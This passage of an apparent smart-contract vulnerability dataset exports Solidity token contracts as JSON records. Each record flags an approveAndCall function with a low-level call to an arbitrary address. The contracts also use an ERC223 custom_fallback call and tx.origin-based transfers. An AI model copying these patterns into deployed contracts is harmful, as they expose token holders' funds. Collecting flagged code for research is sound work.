uint256) balances;\n function transferFunction(address _sender, address _to, uint256 _value) internal returns (bool) {\n require(_to != address(0));\n require(_to != address(this));\n require(_value <= balances[_sender]);\n balances[_sender] = balances[_sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(_sender, _to, _value);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n return transferFunction(msg.sender, _to, _value);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC223TokenCompatible is BasicToken {\n using SafeMath for uint256;\n event Transfer(address indexed from, address indexed to, uint256 value, bytes indexed data);\n function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public returns (bool success) {\n require(_to != address(0));\n require(_to != address(this));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if( isContract(_to) ) {\n _to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool success) {\n return transfer( _to, _value, _data, \"tokenFallback(address,uint256,bytes)\");\n }\n function isContract(address _addr) private view returns (bool is_contract) {\n uint256 length;\n assembly {\n length := extcodesize(_addr)\n }\n return (length>0);\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_to != address(this));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Startable is Ownable, Authorizable {\n event Start();\n bool public started = false;\n modifier whenStarted() {\n require( started || authorized[msg.sender] );\n _;\n }\n function start() onlyOwner public {\n started = true;\n Start();\n }\n}\ncontract StartToken is Startable, ERC223TokenCompatible, StandardToken {\n function transfer(address _to, uint256 _value) public whenStarted returns (bool) {\n return super.transfer(_to, _value);\n }\n function transfer(address _to, uint256 _value, bytes _data) public whenStarted returns (bool) {\n return super.transfer(_to, _value, _data);\n }\n function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenStarted returns (bool) {\n return super.transfer(_to, _value, _data, _custom_fallback);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenStarted returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenStarted returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public whenStarted returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenStarted returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\ncontract HumanStandardToken is StandardToken, StartToken {\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n approve(_spender, _value);\n require(_spender.call(bytes4(keccak256(\"receiveApproval(address,uint256,bytes)\")), msg.sender, _value, _extraData));\n return true;\n }\n}\ncontract BurnToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burnFunction(address _burner, uint256 _value) internal returns (bool) {\n require(_value > 0);\n require(_value <= balances[_burner]);\n balances[_burner] = balances[_burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(_burner, _value);\n return true;\n }\n function burn(uint256 _value) public returns(bool) {\n return burnFunction(msg.sender, _value);\n }\n function burnFrom(address _from, uint256 _value) public returns (bool) {\n require(_value <= allowed[_from][msg.sender]);\n burnFunction(_from, _value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n return true;\n }\n}\ncontract OriginToken is Authorizable, BasicToken, BurnToken {\n function originTransfer(address _to, uint256 _value) onlyAuthorized public returns (bool) {\n return transferFunction(tx.origin, _to, _value);\n }\n function originBurn(uint256 _value) onlyAuthorized public returns(bool) {\n return burnFunction(tx.origin, _value);\n }\n}\ncontract Token is ERC223TokenCompatible, StandardToken, StartToken, HumanStandardToken, BurnToken, OriginToken {\n uint256 public totalSupply;\n uint256 public initialSupply;\n uint8 public decimals;\n string public name;\n string public symbol;\n function Token(uint256 _totalSupply, uint8 _decimals, string _name, string _symbol) public {\n decimals = _decimals;\n totalSupply = _totalSupply * 10 ** uint(decimals);\n initialSupply = totalSupply;\n name = _name;\n symbol = _symbol;\n balances[msg.sender] = totalSupply;\n Transfer(0, msg.sender, totalSupply);\n }\n}\ncontract Presale is Ownable {\n using SafeMath for uint256;\n Token public tokenContract;\n uint8 public decimals;\n uint256 public tokenValue;\n uint256 public centToken;\n uint256 public endTime;\n uint256 public startTime;\n function Presale() public {\n centToken = 25;\n tokenValue = 402693728269933;\n startTime = 1513625400;\n endTime = 1516476600;\n uint256 totalSupply = 12000000;\n decimals = 18;\n string memory name = \"MethaVoucher\";\n string memory symbol = \"MTV\";\n tokenContract = new Token(totalSupply, decimals, name, symbol);\n tokenContract.transferOwnership(msg.sender);\n }\n address public updater;\n event UpdateValue(uint256 newValue);\n function updateValue(uint256 newValue) public {\n require(msg.sender == updater || msg.sender == owner);\n tokenValue = newValue;\n UpdateValue(newValue);\n }\n function updateUpdater(address newUpdater) public onlyOwner {\n updater = newUpdater;\n }\n function updateTime(uint256 _newStart, uint256 _newEnd) public onlyOwner {\n if ( _newStart != 0 ) startTime = _newStart;\n if ( _newEnd != 0 ) endTime = _newEnd;\n }\n event Buy(address buyer, uint256 value);\n function buy(address _buyer) public payable returns(uint256) {\n require(now > startTime);\n require(now < endTime);\n require(msg.value > 0);\n uint256 remainingTokens = tokenContract.balanceOf(this);\n require( remainingTokens > 0 );\n uint256 oneToken = 10 ** uint256(decimals);\n uint256 tokenAmount = msg.value.mul(oneToken).div(tokenValue);\n if ( remainingTokens < tokenAmount ) {\n uint256 refund = (tokenAmount - remainingTokens).mul(tokenValue).div(oneToken);\n tokenAmount = remainingTokens;\n owner.transfer(msg.value-refund);\n remainingTokens = 0;\n _buyer.transfer(refund);\n } else {\n remainingTokens = remainingTokens.sub(tokenAmount);\n owner.transfer(msg.value);\n }\n tokenContract.transfer(_buyer, tokenAmount);\n Buy(_buyer, tokenAmount);\n return tokenAmount;\n }\n function withdraw(address to, uint256 value) public onlyOwner {\n to.transfer(value);\n }\n function updateTokenContract(address _tokenContract) public onlyOwner {\n tokenContract = Token(_tokenContract);\n }\n function withdrawTokens(address to, uint256 value) public onlyOwner returns (bool) {\n return tokenContract.transfer(to, value);\n }\n function () public payable {\n buy(msg.sender);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\napprove(_spender, _value);\nrequire(_spender.call(bytes4(keccak256(\"receiveApproval(address,uint256,bytes)\")), msg.sender, _value, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1461"
  },
  "filename": "31373.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 14000000000;\n totalSupply = 14000000000;\n name = \"New Year Coin\";\n decimals = 0;\n symbol = \"HNY\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1462"
  },
  "filename": "31404.sol",
  "content": "pragma solidity ^0.4.15;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ONUS is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ONUS(\n ) {\n balances[msg.sender] = 1000000000000000;\n totalSupply = 1000000000000000;\n name = \"ONS-ONUS\";\n decimals = 8;\n symbol = \"ONS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1463"
  },
  "filename": "31415.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract GaltCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function GaltCoin(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"GaltCoin\";\n decimals = 2;\n symbol = \"GALT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1464"
  },
  "filename": "31418.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PLUSUPCOIN is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function PLUSUPCOIN(\n ) {\n balances[msg.sender] = 2650000000000000;\n totalSupply = 2650000000000000;\n name = \"PLUSUP COIN\";\n decimals = 8;\n symbol = \"PUC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1465"
  },
  "filename": "31437.sol",
  "content": "pragma solidity ^0.4.19;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() internal {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Authorizable is Ownable {\n mapping(address => bool) public authorized;\n event AuthorizationSet(address indexed addressAuthorized, bool indexed authorization);\n function Authorizable() public {\n authorized[msg.sender] = true;\n }\n modifier onlyAuthorized() {\n require(authorized[msg.sender]);\n _;\n }\n function setAuthorized(address addressAuthorized, bool authorization) onlyOwner public {\n AuthorizationSet(addressAuthorized, authorization);\n authorized[addressAuthorized] = authorization;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transferFunction(address _sender, address _to, uint256 _value) internal returns (bool) {\n require(_to != address(0));\n require(_to != address(this));\n require(_value <= balances[_sender]);\n balances[_sender] = balances[_sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(_sender, _to, _value);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n return transferFunction(msg.sender, _to, _value);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC223TokenCompatible is BasicToken {\n using SafeMath for uint256;\n event Transfer(address indexed from, address indexed to, uint256 value, bytes indexed data);\n function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public returns (bool success) {\n require(_to != address(0));\n require(_to != address(this));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if( isContract(_to) ) {\n _to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool success) {\n return transfer( _to, _value, _data, \"tokenFallback(address,uint256,bytes)\");\n }\n function isContract(address _addr) private view returns (bool is_contract) {\n uint256 length;\n assembly {\n length := extcodesize(_addr)\n }\n return (length>0);\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_to != address(this));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Startable is Ownable, Authorizable {\n event Start();\n bool public started = false;\n modifier whenStarted() {\n require( started || authorized[msg.sender] );\n _;\n }\n function start() onlyOwner public {\n started = true;\n Start();\n }\n}\ncontract StartToken is Startable, ERC223TokenCompatible, StandardToken {\n function transfer(address _to, uint256 _value) public whenStarted returns (bool) {\n return super.transfer(_to, _value);\n }\n function transfer(address _to, uint256 _value, bytes _data) public whenStarted returns (bool) {\n return super.transfer(_to, _value, _data);\n }\n function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenStarted returns (bool) {\n return super.transfer(_to, _value, _data, _custom_fallback);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenStarted returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenStarted returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public whenStarted returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenStarted returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\ncontract HumanStandardToken is StandardToken, StartToken {\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n approve(_spender, _value);\n require(_spender.call(bytes4(keccak256(\"receiveApproval(address,uint256,bytes)\")), msg.sender, _value, _extraData));\n return true;\n }\n}\ncontract BurnToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burnFunction(address _burner, uint256 _value) internal returns (bool) {\n require(_value > 0);\n require(_value <= balances[_burner]);\n balances[_burner] = balances[_burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(_burner, _value);\n return true;\n }\n function burn(uint256 _value) public returns(bool) {\n return burnFunction(msg.sender, _value);\n }\n function burnFrom(address _from, uint256 _value) public returns (bool) {\n require(_value <= allowed[_from][msg.sender]);\n burnFunction(_from, _value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n return true;\n }\n}\ncontract OriginToken is Authorizable, BasicToken, BurnToken {\n function originTransfer(address _to, uint256 _value) onlyAuthorized public returns (bool) {\n return transferFunction(tx.origin, _to, _value);\n }\n function originBurn(uint256 _value) onlyAuthorized public returns(bool) {\n return burnFunction(tx.origin, _value);\n }\n}\ncontract Token is ERC223TokenCompatible, StandardToken, StartToken, HumanStandardToken, BurnToken, OriginToken {\n uint256 public totalSupply;\n uint256 public initialSupply;\n uint8 public decimals;\n string public name;\n string public symbol;\n function Token(uint256 _totalSupply, uint8 _decimals, string _name, string _symbol) public {\n decimals = _decimals;\n totalSupply = _totalSupply * 10 ** uint(decimals);\n initialSupply = totalSupply;\n name = _name;\n symbol = _symbol;\n balances[msg.sender] = totalSupply;\n Transfer(0, msg.sender, totalSupply);\n }\n}\ncontract Presale is Ownable {\n using SafeMath for uint256;\n Token public tokenContract;\n uint8 public decimals;\n uint256 public tokenValue;\n uint256 public centToken;\n uint256 public endTime;\n uint256 public startTime;\n function Presale() public {\n centToken = 25;\n tokenValue = 402693728269933;\n startTime = 1513625400;\n endTime = 1516476600;\n uint256 totalSupply = 12000000;\n decimals = 18;\n string memory name = \"MetaVaucher\";\n string memory symbol = \"MTV\";\n tokenContract = new Token(totalSupply, decimals, name, symbol);\n tokenContract.transferOwnership(msg.sender);\n }\n address public updater;\n event UpdateValue(uint256 newValue);\n function updateValue(uint256 newValue) public {\n require(msg.sender == updater || msg.sender == owner);\n tokenValue = newValue;\n UpdateValue(newValue);\n }\n function updateUpdater(address newUpdater) public onlyOwner {\n updater = newUpdater;\n }\n function updateTime(uint256 _newStart, uint256 _newEnd) public onlyOwner {\n if ( _newStart != 0 ) startTime = _newStart;\n if ( _newEnd != 0 ) endTime = _newEnd;\n }\n event Buy(address buyer, uint256 value);\n function buy(address _buyer) public payable returns(uint256) {\n require(now > startTime);\n require(now < endTime);\n require(msg.value > 0);\n uint256 remainingTokens = tokenContract.balanceOf(this);\n require( remainingTokens > 0 );\n uint256 oneToken = 10 ** uint256(decimals);\n uint256 tokenAmount = msg.value.mul(oneToken).div(tokenValue);\n if ( remainingTokens < tokenAmount ) {\n uint256 refund = (tokenAmount - remainingTokens).mul(tokenValue).div(oneToken);\n tokenAmount = remainingTokens;\n owner.transfer(msg.value-refund);\n remainingTokens = 0;\n _buyer.transfer(refund);\n } else {\n remainingTokens = remainingTokens.sub(tokenAmount);\n owner.transfer(msg.value);\n }\n tokenContract.transfer(_buyer, tokenAmount);\n Buy(_buyer, tokenAmount);\n return tokenAmount;\n }\n function withdraw(address to, uint256 value) public onlyOwner {\n to.transfer(value);\n }\n function updateTokenContract(address _tokenContract) public onlyOwner {\n tokenContract = Token(_tokenContract);\n }\n function withdrawTokens(address to, uint256 value) public onlyOwner returns (bool) {\n return tokenContract.transfer(to, value);\n }\n function () public payable {\n buy(msg.sender);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\napprove(_spender, _value);\nrequire(_spender.call(bytes4(keccak256(\"receiveApproval(address,uint256,bytes)\")), msg.sender, _value, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1466"
  },
  "filename": "31442.sol",
  "content": "pragma solidity 0.4.19;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) view public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender)\n view public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = 